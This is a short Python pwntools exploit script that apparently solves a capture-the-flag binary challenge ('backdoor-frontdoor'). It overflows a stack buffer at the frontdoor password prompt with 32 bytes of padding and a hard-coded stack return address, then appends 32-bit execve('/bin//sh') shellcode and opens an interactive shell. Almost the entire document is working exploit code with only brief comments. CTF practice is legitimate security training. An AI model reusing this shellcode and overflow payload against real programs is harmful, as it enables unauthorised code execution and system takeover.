from pwn import *

# # Establish a connection to the challenge
# r = remote('backdoor-frontdoor.sibersiaga2023.myctf.io', 9998)
target = process("./main")
# Read the initial outputs of the program to clear the stream
# Offset to EIP (based on the information from gdb-pwndbg)
eip_offset = 32

# 32-bit shellcode for spawning a shell
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Constructing the payload
payload = b'A' * eip_offset
payload += p32(0xffffd530 + 4)  # Assuming our input buffer's start address
payload += shellcode

# Clearing initial outputs
target.recvuntil('Enter name : ')

# We don't care about the name input
target.sendline('test')

# Send the payload when asked for the front door password
target.recvuntil('Enter frontdoor password: ')
target.sendline(payload)

# Switch to interactive mode to interact with the shell
target.interactive()